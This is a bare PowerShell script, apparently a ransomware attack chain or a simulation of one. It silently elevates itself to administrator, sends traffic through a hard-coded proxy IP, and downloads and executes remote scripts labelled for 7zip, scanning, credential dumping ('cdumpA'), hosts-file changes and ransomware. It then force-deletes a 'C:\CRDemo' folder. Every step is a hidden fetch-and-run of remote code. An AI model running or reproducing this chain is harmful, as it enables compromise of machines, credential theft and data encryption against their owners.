if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

$proxy_url = 'http://13.231.199.128:3128'; $web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server

#7zip
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509.ps1')

#scanning
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509.ps1')"

#cdumpA
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa_124509.ps1')"

#hosts
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/hosts_124509.ps1')"

#ransom
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/ransom_124509.ps1')"

Remove-Item C:\CRDemo -Recurse -Force
